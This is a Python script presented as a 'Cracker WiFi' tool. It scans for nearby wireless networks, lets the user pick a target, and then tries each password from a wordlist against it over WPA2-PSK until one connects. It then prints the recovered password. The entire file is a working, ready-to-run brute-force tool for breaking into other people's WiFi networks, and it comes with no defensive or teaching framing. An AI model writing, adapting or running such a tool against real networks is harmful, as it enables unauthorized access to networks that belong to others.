from turtle import color
from pywifi import const, PyWiFi ,Profile
from time import sleep
from winsound import Beep # just for Windows
import os
from colorama import Fore as color

os.system("cls")
print(color.RED+"""
 __   __ _          __  __      
 |  \/  | |__  _ __ \ \/ /_ __  
 | |\/| | '_ \| '_ \ \  /| '_ \ 
 | |  | | | | | | | |/  \| |_) |
 |_|  |_|_| |_|_| |_/_/\_\ .__/ 
                         |_|     version 1.0""")
sleep(0.1)
print(color.RED+"""
------------------------------------------------------
|||           Developer: MahanXp              |||
|||           Contact: Tel: @MaHaN_UniQuE     |||               
------------------------------------------------------             
""")
sleep(0.1)
print(color.LIGHTRED_EX+"[1]--Cracker WiFi")
sleep(0.1)
print('')
print(color.LIGHTRED_EX+"[2]--LOGOUT")
sleep(0.1)
print("")


number = input(color.GREEN+"[Number >>> ")

if "1" in number:

    print(color.LIGHTBLUE_EX+"<< Hello WelCome To Cracker WiFi >>")

    def scan(): # For Scan the area
        interface.scan()
        sleep(8)
        result = interface.scan_results()
        return result

    def testwifi(ssid , password):
        interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        interface.connect(interface.add_network_profile(profile))
        sleep(1)
        if interface.status() == const.IFACE_CONNECTED:
            interface.remove_network_profile(profile)
            return True
        else:
            interface.remove_network_profile(profile)
            return False
            
            
    wifi = PyWiFi() # Wifi Object
    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
    print(color.LIGHTMAGENTA_EX+"< Enter The List Password Name To Crack PassWord >")
    print(color.LIGHTMAGENTA_EX+"<<< Please Enter The List Password File In The Tool Path And Enter Its Name >>>")
    passlist = input(color.LIGHTMAGENTA_EX+"<<Enter The PassWord List To Crack WiFi : ") # Password List

    print(color.GREEN+"<<Scanning ... ")
    APs = scan()

    for i in range(len(APs)):
        print("{} - {}".format(i+1 ,APs[i].ssid))

    index = int(input("\n>> "))
    target = APs[index-1]

    for password in open(passlist):
        password = password.strip("\n")
        print(color.RED+"Testing : {}".format(password))
        if testwifi(target.ssid , password) : # Test for connection using password
            Beep(700 , 500) # Boooooghhh (just for windows)
            Beep(1000 , 500) # BOOOOOOGHHHHHHH :|  (just for windows)
            print("-" *30)
            print(color.GREEN+"PASSWORD : {}".format(password))
            print("-" *30)
            break

    input()  

if "2" in number:
    print("Good Bay ...")